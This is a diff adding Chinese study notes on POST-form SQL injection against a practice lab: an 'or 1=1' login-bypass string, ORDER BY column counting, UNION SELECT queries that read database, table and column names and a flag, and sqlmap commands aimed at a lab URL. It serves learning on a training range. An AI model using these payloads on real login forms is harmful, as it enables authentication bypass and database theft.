@@ -1,0 +1,27 @@
+post注入
+
+
+第一种
+1.万能密码：' or 1=1 -- qwe
+
+2.成功之后进行字段的猜解 ' or 1=1 order by 1 -- qwe  (注意这里的靶场是3 输入order by 4后会出现报错)
+
+3.根据order by猜解出字段数后 找出输出点 ' union select 1,2,3 -- qwe (这里不用写 or 1=1了 因为前面执行正确了后面就不执行了)
+
+4.老办法先 ' union select 1,2,database() -- qwe 找出库名
+
+  然后找出表名 ' union select 1,2,table_name from information_schema.tables where table_schema=database() -- qwe 
+  
+  再 ' union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name='flag' -- qwe 
+  
+  再找到对应表的字段名 ' union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name='flag' limit 1,1 -- qwe
+
+  根据字段名查找出靶场的flag ' union select 1,2,flag from flag -- qwe
+  
+  
+第二种
+sqlmap进行暴力破解
+
+python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-05/index.php" --form  (跑post注入后面记得加--form)
+
+若是不行 记得加上等级跑 python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-05/index.php" --form --level 3 --risk 2
